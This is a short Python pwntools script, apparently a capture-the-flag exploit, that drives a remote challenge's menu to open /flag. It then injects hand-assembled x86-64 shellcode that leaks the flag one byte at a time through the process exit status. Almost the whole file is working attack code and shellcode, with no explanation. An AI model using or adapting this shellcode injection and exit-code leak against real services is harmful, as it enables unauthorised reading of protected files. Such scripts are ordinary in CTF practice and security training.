import argparse

from pwn import *

context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

# Shell code time
flag = []
for i in range(0, 0x10):
    r = remote(HOST, int(PORT))

    # Open flag
    r.sendafter("Choice: ", "1\n")
    r.sendafter("> ", "/flag\n")

    # idk why i need to do it twice
    r.sendafter("Choice: ", "1\n")
    r.sendafter("> ", "/flag\n")

    r.sendafter("Choice: ", "2\n")

    r.sendafter("Choice: ", "1\n")
    r.sendafter("> ", "/dev/stdin\n")

    # thanks, binja
    """
    int main() {
        char ch[0x10];
        read(5, ch, i);
        exit(ch[<i>]);
    }
    """
    sc = b'H\x81\xec\x00\x10\x00\x00H\x8b\xecH\x8dd$\xf0H\x8du\xf03\xc0j\x05_j\x10Z\x0f\x05\x8aE' + bytes([(0xf0 + i) % 256]) + b'\x0f\xbe\xf8j<X\x0f\x05'
    sc = sc + b'\x90' * (0x100 - len(sc))
    r.send(sc)
    r.sendafter("Choice: ", "2\n")
    r.recvuntil("status: ")
    r.recvuntil("status: ")
    b = int(r.recvuntil("\n").strip().decode())

    if b == 0:
        break

    print(b)
    flag += [chr(b>>8)]

print(flag)

r.interactive()

